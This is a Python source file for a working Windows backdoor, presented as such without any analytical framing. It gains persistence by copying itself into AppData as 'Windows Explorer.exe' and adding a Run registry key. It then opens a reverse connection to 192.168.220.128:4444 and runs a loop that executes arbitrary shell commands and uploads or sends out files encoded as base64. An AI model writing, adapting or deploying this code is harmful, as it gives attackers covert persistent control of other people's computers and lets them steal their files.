import socket,json,base64,shutil
import subprocess,os,sys

class Backdoor:
    def __init__(self,ip,port):
        self.persistent()
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))

    def persistent(self):
        evil_file = os.environ['appdata'] + '\\Windows Explorer.exe'
        if not os.path.exists(evil_file):
            shutil.copyfile(sys.executable,evil_file)
            subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "{evil_file}" ',shell=True)

    def reliable_send(self,data):
        json_data = json.dumps(data.decode())
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        data = ""
        while True:
            try:
                data +=self.connection.recv(1024).decode()
                return json.loads(data)
            except ValueError:
                continue

    def change_directory(self,path):
        os.chdir(path)
        return f'[+] Change directory to {path}'.encode()
    
    def execution_command(self,command) -> str :
        return subprocess.check_output(command,shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)

    def read_file(self,path):
        with open(path,'rb') as file:
            return base64.b64encode(file.read())
    
    def download_file(self,path,contain):
        path = path.split('\\')[-1]
        with open(path,'wb') as file:
            file.write(base64.b64decode(contain))
            return "[+] File uploaded.".encode()

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == 'exit':
                    self.connection.close()
                    sys.exit()
                elif command[0] == 'cd' and len(command) > 1:
                    answer = self.change_directory(command[1])
                elif command[0] == 'download':
                    answer = self.read_file(command[1])
                elif command[0] == 'upload':
                    answer = self.download_file(command[1],command[2].encode())
                else :
                    answer = self.execution_command(command)
            except:
                answer = "[-] Wrong Command and opretion did't completed".encode()

            self.reliable_send(answer)

        self.connection.close()



try:
    backdoor = Backdoor('192.168.220.128',4444)
    backdoor.run()
except:
    sys.exit()

